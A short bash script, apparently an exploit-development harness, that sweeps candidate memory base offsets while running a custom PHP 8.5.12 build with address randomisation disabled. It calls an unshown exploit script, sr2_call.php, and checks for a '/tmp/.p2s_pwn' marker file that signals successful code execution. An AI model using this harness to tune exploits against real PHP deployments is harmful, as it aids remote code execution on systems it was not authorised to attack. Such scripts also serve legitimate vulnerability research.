#!/bin/bash
# Isolate the layout variable: fine sweep (step 0x1000) with marker=/tmp/.p2s_pwn
set -u
PHP=/tmp/php8512_build/plain2/sapi/cli/php
W=/tmp/dbg_zero5
cd $W
ZIF=0093824996228192
for off in 7a000 7b000 7c000 7d000 7e000 7f000 80000 81000 82000 83000 84000 85000 86000 87000 88000; do
  base=$((0x7ffff5400000 + 0x$off))
  dec=$(printf "%016d" $base)
  rm -f /tmp/.p2s_pwn /tmp/.p2s_cmd
  timeout 30 setarch x86_64 -R $PHP -n sr2_call.php "$dec" "$ZIF" >/dev/null 2>&1
  rc=$?
  if [ -f /tmp/.p2s_pwn ]; then echo "HIT +0x$off rc=$rc :: $(cat /tmp/.p2s_pwn)"; exit 0; fi
  echo "+0x$off rc=$rc"
done
echo "no hit"
